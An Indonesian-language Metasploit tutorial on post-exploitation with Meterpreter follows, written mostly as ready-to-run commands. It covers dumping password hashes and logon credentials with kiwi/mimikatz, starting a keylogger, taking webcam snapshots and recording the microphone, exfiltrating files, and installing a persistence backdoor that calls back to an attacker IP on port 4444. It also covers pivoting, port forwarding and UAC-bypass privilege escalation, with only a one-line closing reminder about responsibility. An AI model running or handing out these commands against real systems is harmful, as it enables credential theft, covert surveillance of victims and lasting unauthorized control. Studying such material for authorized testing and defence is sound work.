# Post-Exploitation di Metasploit

## A. Apa Itu Post-Exploitation?

`Post-Exploitation` adalah tahap lanjutan setelah berhasil mendapatkan akses ke sistem target. Di Metasploit, khususnya dengan Meterpreter session, kamu bisa melakukan berbagai aktivitas lanjutan untuk `mengumpulkan informasi`, `memperluas akses`, hingga `mengambil alih sistem` secara penuh.

## B. Konsep Dasar Meterpreter

`Meterpreter` adalah payload berbasis memory injection yang powerful, interaktif, dan tidak menulis file ke disk (stealthy). Setelah exploit berhasil, Meterpreter menyediakan antarmuka CLI untuk post-exploitation.

## C. Perintah Dasar Meterpreter

| Perintah	| Fungsi |
|:--:|:--:|
| `sysinfo`	| Melihat informasi sistem target |
| `getuid` | Menampilkan User ID (UID) |
| `ps` | Menampilkan proses yang sedang berjalan |
| `shell`	| Membuka command shell dari mesin target |
| `getprivs` | Menampilkan privilege yang dimiliki |
| `getsystem`	| Mencoba escalate privilege jadi SYSTEM |
| `screenshot` | Mengambil tangkapan layar target |

## D. Dump Password Hash

Langkah-langkah:

### 1. Jalankan:

```
meterpreter > load kiwi
```

### 2. Dump Hash SAM:

```
meterpreter > hashdump
```

### 3. Atau Menggunakan Mimikatz:

```
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

## E. Keylogger

### 1. Mulai keylogger:

```
meterpreter > keyscan_start
```

### 2. Lihast Hasil

```
meterpreter > keyscan_dump
```

### 3. Hentikan:

```
meterpreter > keyscan_stop
```

## F. Webcam (Ambil Gambar)

### 1. Cek webcam:

```
meterpreter > webcam_list
```

### 2. Ambil gambar:

```
meterpreter > webcam_snap
```

### 3. Atau rekam:

```
meterpreter > record_mic
```

## F. File & Data Collection

| Perintah	| Fungsi |
|:--:|:--:|
| `ls`, `cd`, `pwd` | Navigasi file |
| `download <file>`	| Unduh file dari target |
| `upload <file>`	| Upload file ke target |
| `search -f *.docx`	| Cari file tertentu |
| `cat <file>`	| Lihat isi file|

## G. Persistence (Backdoor)

Contoh membuat persistence di Windows:

```
meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.10
```

**Keterangan:**

- Autostart saat login.
- `-i` : Interval `5 detik`.
- `-p` : Port listener `4444`.
- `-r` : IP attacker: `192.168.1.10`.

## Pivoting dan Port Forwarding

Jika target berada di jaringan internal, kamu bisa pivot ke sistem lain:

```
meterpreter > run autoroute -s 192.168.10.0/24
```

Gunakan port forwarding untuk akses service internal:

```
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.10.10
```

## I. Privilege Escalation

Coba naikkan hak akses jadi SYSTEM:

```
meterpreter > getsystem
```

Atau gunakan exploit lokal seperti:

```
msf6 > use exploit/windows/local/bypassuac
```

## J. Kesimpulan

Post-exploitation adalah fase paling menentukan dalam operasi penetrasi. Dengan Meterpreter, kamu bisa:

- Mengumpulkan informasi sensitif.
- Menanamkan backdoor.
- Mengendalikan perangkat target secara penuh.

> Pastikan semua aksi kamu terukur, tercatat, dan bertanggung jawab.
